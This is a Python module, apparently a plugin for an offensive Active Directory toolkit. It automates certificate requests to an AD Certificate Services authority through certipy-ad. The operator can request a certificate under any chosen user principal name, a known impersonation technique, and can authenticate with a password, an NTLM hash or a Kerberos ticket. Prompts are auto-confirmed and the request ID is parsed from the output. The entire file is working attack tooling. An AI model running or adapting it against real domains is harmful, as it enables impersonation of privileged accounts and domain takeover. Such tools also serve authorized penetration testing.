import subprocess
import os
from pathlib import Path


def run(data, cred, args):
    extra = getattr(args, "extra", []) or []

    # -------------------------
    # TEMPLATE (positional)
    # -------------------------
    if not extra:
        print("[-] Missing template name")
        return None

    template = extra[0]

    # -------------------------
    # FLAGS (SAFE ACCESS)
    # -------------------------
    request_upn = getattr(args, "user", None)
    ca = getattr(args, "ca", None) or data.get("adcs", {}).get("ca")
    dns = getattr(args, "dns", None)
    out_dir = Path(args.out).expanduser().resolve() if getattr(args, "out", None) else None

    # -------------------------
    # BASE DATA
    # -------------------------
    domain = data.get("domain")
    ip = data.get("ip")

    auth_user = cred.get("user")
    typ = cred.get("type")
    secret = cred.get("secret")

    if not template or not auth_user or not domain or not ip or not ca:
        print("[-] Missing required values")
        return None

    # -------------------------
    # UPN LOGIC (CRITICAL)
    # -------------------------
    if not request_upn:
        request_upn = auth_user

    if "@" not in request_upn:
        request_upn = f"{request_upn}@{domain}"

    # -------------------------
    # BUILD COMMAND
    # -------------------------
    cmd = [
        "certipy-ad", "req",
        "-username", f"{auth_user}@{domain}",
        "-ca", ca,
        "-dc-ip", ip,
        "-template", template,
        "-upn", request_upn
    ]

    env = os.environ.copy()

    if typ == "password":
        cmd += ["-password", secret]

    elif typ == "ntlm":
        ntlm = secret if ":" in secret else f":{secret}"
        cmd += ["-hashes", ntlm]

    elif typ == "ticket":
        env["KRB5CCNAME"] = secret
        cmd += ["-k", "-no-pass"]

    else:
        print("[-] Unsupported credential type")
        return None

    if dns:
        cmd += ["-dns", dns]

    cmd += ["-debug"]
    cmd = [str(x) for x in cmd]

    print(f"[*] Running: {' '.join(cmd)}")

    # -------------------------
    # EXECUTE
    # -------------------------
    result = subprocess.run(
        cmd,
        capture_output=True,
        text=True,
        input="y\n",
        env=env
    )

    output = result.stdout + result.stderr
    print(output)

    # -------------------------
    # REQUEST ID PARSING
    # -------------------------
    request_id = None
    for line in output.splitlines():
        if "request id is" in line.lower():
            request_id = line.split()[-1]

    if request_id:
        print(f"[+] Request ID: {request_id}")
    else:
        print("[-] Failed to extract Request ID")

    return {
        "success": request_id is not None,
        "request_id": request_id,
        "output": output
    }